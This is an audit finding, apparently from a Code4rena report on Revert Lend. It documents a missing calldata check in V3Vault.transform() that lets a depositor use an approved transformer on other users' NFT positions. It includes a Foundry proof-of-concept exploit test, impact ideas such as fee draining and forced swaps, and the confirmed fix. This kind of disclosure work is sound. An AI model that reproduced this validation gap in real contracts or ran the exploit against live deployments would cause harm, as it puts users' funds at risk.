[H-03]V3Vault::transformdoes not validate thedatainput and allows a depositor to exploit any position approved on the transformer
Submitted byb0g0
Any account holding a position insideV3Vaultcan transform any NFT position outside the vault that has been delegated to Revert operators for transformation (AutoRange,AutoCompoundand all other transformers that manage positions outside of the vault).
The exploiter can pass anyparamsat any time, affecting positions they do not own and their funds critically.
Vulnerability details
In order to borrow fromV3Vault, an account must first create a collateralized position by sending his position NFT through thecreate()function
Any account that has a position inside the vault can use thetransform()function to manage the NFT, while it is owned by the vault:
https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497
function transform(uint256 tokenId, address transformer, bytes calldata data)externaloverridereturns (uint256 newTokenId){....//@audit -> tokenId inside data not checked(uint256 newDebtExchangeRateX96,) = _updateGlobalInterest();address loanOwner = tokenOwner[tokenId];// only the owner of the loan, the vault itself or any approved caller can call thisif (loanOwner != msg.sender && !transformApprovals[loanOwner][tokenId][msg.sender]) {revert Unauthorized();}// give access to transformernonfungiblePositionManager.approve(transformer, tokenId);(bool success,) = transformer.call(data);if (!success) {revert TransformFailed();}....// check owner not changed (NEEDED because token could have been moved somewhere else in the meantime)address owner = nonfungiblePositionManager.ownerOf(tokenId);if (owner != address(this)) {revert Unauthorized();}....return tokenId;}
The user passes an approved transformer address and the calldata to execute on it. The problem here is that the function only validates the ownership of theuint256 tokenIdinput parameter. However, it never checks if thetokenIdencoded insidebytes calldata dataparameter belongs tomsg.sender.
This allows any vault position holder tocall an allowed transformer with arbitrary params encoded as calldata and change any position delegated to that transformer.
This will impact all current and future transformers that manage Vault positions. To prove the exploit, Iâ€™m providing a coded POC using theAutoCompoundtransformer.
Proof of Concept
A short explanation of the POC:
Aliceis an account outside the vault that approves her positionALICE_NFTto be auto-compounded by Revert controlled operators (bots).Bobdecides to act maliciously and transformAliceposition.Bobopens a position in the vault with hisBOB_NFTso that he can calltransform().BobcallsV3Vault.transform()withBOB_NFTastokenIdparam to pass validation but encodesALICE_NFTinside data.Bobsuccessfully transformsAliceposition with his params.
You can add the following test toV3Vault.t.soland runforge test --contracts /test/V3Vault.t.sol --mt testTransformExploit -vvvv.
functiontestTransformExploit()external{// AliceaddressALICE_ACCOUNT=TEST_NFT_ACCOUNT;uint256ALICE_NFT=TEST_NFT;// Malicious useraddressEXPLOITER_ACCOUNT=TEST_NFT_ACCOUNT_2;uint256EXPLOITER_NFT=TEST_NFT_2;// Set up an auto-compound transformerAutoCompoundautoCompound=newAutoCompound(NPM,WHALE_ACCOUNT,WHALE_ACCOUNT,60,100);vault.setTransformer(address(autoCompound),true);autoCompound.setVault(address(vault),true);// Set fee to 2%uint256Q64=2**64;autoCompound.setReward(uint64(Q64/50));// Alice decides to delegate her position to// Revert bots (outside of vault) to be auto-compoundedvm.prank(ALICE_ACCOUNT);NPM.approve(address(autoCompound),ALICE_NFT);// Exploiter opens a position in the Vaultvm.startPrank(EXPLOITER_ACCOUNT);NPM.approve(address(vault),EXPLOITER_NFT);vault.create(EXPLOITER_NFT,EXPLOITER_ACCOUNT);vm.stopPrank();// Exploiter passes ALICE_NFT as paramAutoCompound.ExecuteParamsmemoryparams=AutoCompound.ExecuteParams(ALICE_NFT,false,0);// Exploiter account uses his own token to pass validation// but transforms Alice positionvm.prank(EXPLOITER_ACCOUNT);vault.transform(EXPLOITER_NFT,address(autoCompound),abi.encodeWithSelector(AutoCompound.execute.selector,params));}
Since the exploiter can control the calldata send to the transformer, he can impact any approved position in various ways. In the case ofAutoCompoundit can be:
Draining the position funds -AutoCompoundcollects a fee on every transformation. The exploiter can call it multiple times.Manipulatingswap0To1&amountInparameters to execute swaps in unfavourable market conditions, leading to loss of funds or value extraction.
Those are only a couple of ideas. The impact can be quite severe depending on the transformer and parameters passed.
Tools Used
Foundry
Recommended Mitigation Steps
Consider adding a check insidetransform()to make sure the providedtokenIdand the one encoded as calldata are the same. This way the caller will not be able to manipulate other accounts positions.
Assessed type
Invalid Validation
kalinbas (Revert) confirmed
Revert mitigated:
PRhere- refactoring to make all transformers properly check caller permission.
Status:Mitigation confirmed. Full details in reports fromktg,thank_youandb0g0.